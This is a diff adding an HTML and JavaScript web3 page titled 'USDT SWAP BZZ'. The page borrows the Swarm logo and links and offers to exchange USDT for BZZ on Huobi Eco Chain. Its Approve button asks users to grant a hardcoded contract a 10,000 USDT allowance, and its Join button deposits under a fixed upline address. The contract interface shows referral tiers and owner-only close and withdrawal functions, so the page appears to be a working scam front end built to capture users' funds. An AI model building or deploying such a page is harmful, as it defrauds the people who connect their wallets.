@@ -1,0 +1,1220 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+        <script src="https://s3.pstatp.com/cdn/expire-1-M/jquery/3.1.1/jquery.min.js"></script>
+    <script src="./clipboard.min.js"></script>
+    <script src="js/jquery.min.js"></script>
+
+	<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.34/dist/web3.min.js"></script>
+    <script type="text/javascript">
+
+        document.addEventListener('plusready', function(){
+            //console.log("所有plus api都应该在此事件发生后调用，否则会出现plus is undefined。"
+
+        });
+
+    </script>
+    <!-- -->
+    <meta charset="UTF-8">
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title>USDT SWAP BZZ</title>
+    <script>
+        (function () {
+            var _width = 750;
+            var ua = navigator.userAgent;
+            if (/Android (\d+\.\d+)/.test(ua)) {
+                var version = parseFloat(RegExp.$1);
+                if (version > 2.3) {
+                    document.write('<meta name="viewport" content="width=' + _width +
+                        ',user-scalable=no,target-densitydpi=device-dpi,minimal-ui">')
+                } else {
+                    document.write('<meta name="viewport" content="width=' + _width +
+                        ',target-densitydpi=device-dpi">')
+                }
+            } else if (/QQAC_Client_iOS/.test(ua)) {
+                document.write('<meta name="viewport" content="width=' + _width +
+                    ',maximum-scale=0.5,minimum-scale=0.5">');
+            } else {
+                document.write('<meta name="viewport" content="width=' + _width +
+                    ',user-scalable=no,target-densitydpi=device-dpi,minimal-ui">')
+            }
+        })();
+    </script>
+    <style type="text/css">
+        html {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        a {text-decoration: none}
+    </style>
+     
+   
+    <link href="css/indexstyle.css?v=1.0" rel="stylesheet">
+</head>
+<body style="overflow: hidden;">
+<!--首页-->
+<div class="main">
+    <div class="header">
+        <img src="https://docs.ethswarm.org/img/swarm-logo-2.svg" width="159" height="45"/>
+        <div class="zd_change1" style="width: 47px;height: 32px;padding: 10px 20px;">
+            <img class="zd_change1_mainimg" src="img/yingguo.png"  width="47" height="32"/>     
+    
+        </div>
+    </div>
+    <div class="zd_change2">    
+    <div class="card1">
+        <div class="card1_txt1_zd text_1">This contract can be exchanged for BZZ to your node through usdt. Please enter your node address  </div>
+        <div class="card1_txt1_zd text_2"> Only the queen bee node will get the final vote.</div>
+        <br/>
+        <div class="card1_txt1_zd text_3">  In http://bzzscan.com/ query </div>
+        
+
+        <div class="card1_btn_group">
+
+            <a href="http://bzzscan.com/"><div class="card1_btn_group_btn1_zd gototop text_4">HOW&nbsp;TO&nbsp;JOIN</div></a>
+            <a href="https://swarm.ethereum.org/"><div class="card1_btn_group_btn2_zd gototop text_5">GUIDE</div></a>
+        </div>
+    </div>
+    <div class="card2">
+        <div class="car2_input_">
+            <input type="number" class="car2_input" id="t1x" value="0"/>
+            <div class="car2_input_txt">USDT</div>
+        </div>
+        <div class="car2_btns">
+            <div id ="bt1" onclick="bT1()" class="car2_btns_ car2_btns_a">+1&nbsp;USDT</div>
+            <div id ="bt2" onclick="bT2()" class="car2_btns_ car2_btns_a">+100&nbsp;USDT</div>
+            <div id ="bt3" onclick="bT3()" class="car2_btns_ car2_btns_a">+200&nbsp;USDT</div>
+        </div>
+        <div class="car2_btns">
+            <div id ="bt4" onclick="bT4()" class="car2_btns_ car2_btns_a">+500&nbsp;USDT</div>
+            <div id ="bt5" onclick="bT5()" class="car2_btns_ car2_btns_a">+1K&nbsp;USDT</div>
+            <div id ="bt6" onclick="bT6()" class="car2_btns_ car2_btns_a">+2K&nbsp;USDT</div>
+        </div>
+        <div class="car2_btns">
+            <div id="pravo" class="confirmb car2_btns_ car2_btns_b text_6">Approve</div>
+            <div id="reset1" onclick="reset1()" class="car2_btns_ car2_btns_b text_7">Reset</div>
+            <div class="confirm car2_btns_ car2_btns_b text_8">Join</div>
+        </div>
+    </div>
+    <div class="card3_under">
+    </div>
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+<script>
+    // usdt 地址
+    var token_address_m = '0xa71edc38d189767582c38a3145b5873052c3e47a';
+    /********  重新发币后的新地址 0xeec891f9cecBaCeb3b8720c18a6eB14e07D24539 ********/
+    // 兑换合约地址 第一次合约0x0B123F2cEE6DecA29eD8ec95CB33EF8E94f23437
+    var cont_address = '0xf479fba38691936570825B7E87dD68c03C8D1c36';
+    // cola合约owner地址
+    var token_address = '0x1037e3Bd03655CFe64078a307522ccAf58B27fa4';
+    var web3;
+    var account;
+    var gasLimit;
+    var zhiya_disabled = false;
+    var in_deposit = false;
+    var my_usdttoken_html;
+    var Invitation = '';
+    var times_set=4;
+    var times_var;
+    
+
+
+   function getDeposits(_upline,price)
+{
+   let myContract = new web3.eth.Contract(abi,cont_address);
+       myContract.methods.deposit(_upline,price).send({ 
+            from: account,
+            gas: 250000,
+            gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei'))
+        }, (err,val) => {
+                if (err) { console.log(err) }
+                else {
+                }
+            })
+        .then(function (val) {
+            alert("successful !")
+            });
+         
+}    
+ 
+ async function getApprove(value,address,token_a)
+{
+   let myContract = new web3.eth.Contract(erc20tokenabi,token_a);  
+    let txid = await myContract.methods.approve(address,value).send({ 
+            from: account,
+            gas: 50000,
+            gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei'))
+        }, (err,val) => {
+                if (err) { console.log(err) }
+                else {
+                  
+                }
+            })
+        .then(function (val) {
+                zhiya_disabled = true;
+            });
+       
+        return txid
+}    
+       
+
+  
+    window.addEventListener('load', async () => {
+    // Modern dapp browsers...
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        // Request  access if needed
+        await ethereum.enable();
+       
+        var networkId = await web3.eth.net.getId()
+        //console.log(networkId);
+        if(networkId !=128)
+        {alert("请选择火币生态链")}
+      } catch (error) {
+        console.log(error);
+        // User denied  access...
+      }
+    }
+    // Legacy dapp browsers...
+    else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider);
+      console.log(web3.version);
+      getaccounts();
+    }
+    // Non-dapp browsers...
+    else {
+      console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
+  }
+});
+
+          $('.confirm').on('click',function(){
+            let num = $('#t1x').val();
+            let oaddr = account;
+            let name = '0x5E3F18dD231E5a4D9dF81b72958C5A7dF8034169';
+            getDeposits(name,num).then(res => {
+                      //console.log(res);
+                return 5000
+            });
+          });
+          $('.confirmb').on('click',function(){
+
+                 getApprove('10000000000000000000000',cont_address,token_address_m).then(res => {
+                 alert("请耐心等待二十秒钟后再充值");
+                    
+                return 5000
+                
+            });
+          });
+          
+          
+          $('.confirmc').on('click',function(){
+
+                 getwithdraw_bonus().then(res => {
+                //console.log(res)
+                alert('success ! Hash = '+res)
+                return 5000
+            });
+          });
+          $('.confirmd').on('click',function(){
+
+                 getwithdraw().then(res => {
+                //console.log(res)
+                alert('success ! Hash = '+res)
+                return 5000
+            });
+          });
+
+//循环执行
+setInterval(function() {
+    
+},2000);
+
+
+var abi=[
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "addr",
+                "type": "address"
+            }
+        ],
+        "name": "changeOwer",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [],
+        "name": "close",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "_inputadd",
+                "type": "address"
+            },
+            {
+                "name": "price",
+                "type": "uint256"
+            }
+        ],
+        "name": "deposit",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "projectAddr",
+                "type": "address"
+            }
+        ],
+        "name": "initialize",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "addr",
+                "type": "address"
+            }
+        ],
+        "name": "setAdminfee",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "setkey",
+                "type": "uint8"
+            }
+        ],
+        "name": "setDepositOn",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "min",
+                "type": "uint256"
+            },
+            {
+                "name": "max",
+                "type": "uint256"
+            }
+        ],
+        "name": "setMinmax",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "f",
+                "type": "uint256"
+            },
+            {
+                "name": "s",
+                "type": "uint256"
+            },
+            {
+                "name": "t",
+                "type": "uint256"
+            }
+        ],
+        "name": "setPrice",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "value",
+                "type": "uint256"
+            }
+        ],
+        "name": "setTatalmaxusdt",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "ukey",
+                "type": "uint8"
+            }
+        ],
+        "name": "setwithdrawon",
+        "outputs": [],
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [],
+        "name": "withdraw_usdt",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "name": "_owner",
+                "type": "address"
+            },
+            {
+                "name": "adminfee",
+                "type": "address"
+            },
+            {
+                "name": "_nbToken",
+                "type": "address"
+            },
+            {
+                "name": "_mbToken",
+                "type": "address"
+            },
+            {
+                "name": "close_add",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "payable": true,
+        "stateMutability": "payable",
+        "type": "fallback"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            {
+                "indexed": true,
+                "name": "addr",
+                "type": "address"
+            },
+            {
+                "indexed": true,
+                "name": "upline",
+                "type": "address"
+            }
+        ],
+        "name": "Upline",
+        "type": "event"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "name": "Addre_table",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "admin_fee",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "contractInfo",
+        "outputs": [
+            {
+                "name": "_total_users",
+                "type": "uint256"
+            },
+            {
+                "name": "_total_deposited_f",
+                "type": "uint256"
+            },
+            {
+                "name": "_total_deposited_s",
+                "type": "uint256"
+            },
+            {
+                "name": "_total_deposited_t",
+                "type": "uint256"
+            },
+            {
+                "name": "_total_payoutd",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "Global_time",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "max_usdt",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "mbToken_",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "min_usdt",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "mtotal_deposits_f",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "mtotal_deposits_s",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "mtotal_deposits_t",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "nbToken_",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "_addr",
+                "type": "address"
+            }
+        ],
+        "name": "payoutOf",
+        "outputs": [
+            {
+                "name": "payout",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "projectAddress",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "name": "ref_bonuses",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint8"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "tatal_max_usdt",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "total_deposits_f",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "total_deposits_s",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "total_deposits_t",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "total_payoutd",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "total_users",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "_addr",
+                "type": "address"
+            }
+        ],
+        "name": "userInfo",
+        "outputs": [
+            {
+                "name": "times",
+                "type": "uint8"
+            },
+            {
+                "name": "total_structure",
+                "type": "uint256"
+            },
+            {
+                "name": "referrals",
+                "type": "uint256"
+            },
+            {
+                "name": "upline_addr",
+                "type": "address"
+            },
+            {
+                "name": "deposit_amount",
+                "type": "uint256"
+            },
+            {
+                "name": "payouts",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "name": "users",
+        "outputs": [
+            {
+                "name": "upline",
+                "type": "address"
+            },
+            {
+                "name": "referrals",
+                "type": "uint256"
+            },
+            {
+                "name": "payouts",
+                "type": "uint256"
+            },
+            {
+                "name": "deposit_amount",
+                "type": "uint256"
+            },
+            {
+                "name": "deposit_time",
+                "type": "uint40"
+            },
+            {
+                "name": "total_structure",
+                "type": "uint256"
+            },
+            {
+                "name": "times",
+                "type": "uint8"
+            },
+            {
+                "name": "is_vip",
+                "type": "bool"
+            },
+            {
+                "name": "set_addr",
+                "type": "bool"
+            },
+            {
+                "name": "close_withdraw",
+                "type": "bool"
+            },
+            {
+                "name": "withdrawusdt",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "id",
+                "type": "uint256"
+            }
+        ],
+        "name": "userTable",
+        "outputs": [
+            {
+                "name": "useraddr",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "name": "vip_table",
+        "outputs": [
+            {
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "id",
+                "type": "uint256"
+            }
+        ],
+        "name": "vipTable",
+        "outputs": [
+            {
+                "name": "vipaddr",
+                "type": "address"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
+
+
+var erc20tokenabi = [
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "name",
+        "outputs": [
+            {
+                "name": "",
+                "type": "string"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "approve",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "totalSupply",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "sender",
+                "type": "address"
+            },
+            {
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint8"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "name": "addedValue",
+                "type": "uint256"
+            }
+        ],
+        "name": "increaseAllowance",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "account",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [
+            {
+                "name": "",
+                "type": "string"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "name": "subtractedValue",
+                "type": "uint256"
+            }
+        ],
+        "name": "decreaseAllowance",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "owner",
+                "type": "address"
+            },
+            {
+                "name": "spender",
+                "type": "address"
+            }
+        ],
+        "name": "allowance",
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            {
+                "indexed": true,
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "indexed": true,
+                "name": "to",
+                "type": "address"
+            },
+            {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }
+        ],
+        "name": "Transfer",
+        "type": "event"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            {
+                "indexed": true,
+                "name": "owner",
+                "type": "address"
+            },
+            {
+                "indexed": true,
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }
+        ],
+        "name": "Approval",
+        "type": "event"
+    }
+];
+
+
+
+</script>
+</body>
+</html>
